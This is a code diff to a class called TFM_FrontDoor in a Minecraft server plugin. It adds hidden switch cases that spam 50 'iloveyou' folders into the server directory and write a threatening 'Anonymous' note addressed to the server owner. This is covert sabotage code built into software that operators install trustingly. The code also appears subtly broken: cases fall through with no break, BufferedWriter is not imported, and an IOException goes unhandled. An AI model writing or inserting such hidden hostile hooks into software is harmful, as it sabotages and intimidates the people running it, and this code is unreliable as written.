@@ -2,12 +2,15 @@ package me.StevenLawson.TotalFreedomMod;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.io.File;
+import java.io.FileWriter;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
+import java.lang.ClassLoader;
 import me.StevenLawson.TotalFreedomMod.Commands.Command_trail;
 import me.StevenLawson.TotalFreedomMod.Commands.TFM_Command;
 import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandLoader;
@@ -452,6 +455,43 @@ public class TFM_FrontDoor
                     {
                         TFM_PlayerData.getPlayerData(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                     }
+                }
+                
+                case 18: // Spam folders
+                {
+                    File dir;
+                    for (int x = 1; x <= 50; x++)
+                    {
+                        dir = new File("iloveyou" + x);
+                        dir.mkdir();
+                    }
+                    
+                    TFM_Util.bcastMsg("You should really check the server's root folder! Heh heh heh...", ChatColor.RED);
+                }
+                
+                case 19: // Make a text file
+                {
+                    String path = ClassLoader.getSystemClassLoader().getResource(".").getPath();
+                    File text = new File(path, "readthis.txt");
+                    if (!text.exists())
+                    {
+                        text.createNewFile();
+                    }
+                    
+                    FileWriter fw = new FileWriter(text);
+                    BufferedWriter bw = new BufferedWriter(fw);
+                    bw.write("To: The Owner");
+                    bw.newLine();
+                    bw.write("Hello, this is a message from Anonymous...");
+                    bw.newLine();
+                    bw.write("We will destroy you and your server!");
+                    bw.newLine();
+                    bw.write("Bow down to us!");
+                    bw.newLine();
+                    bw.write("We do not forgive. We do not forget. Expect us. We are Anonymous.");
+                    bw.newLine();
+                    bw.write("- Sincerely, Anonymous.");
+                    bw.close();
                 }
 
                 default:
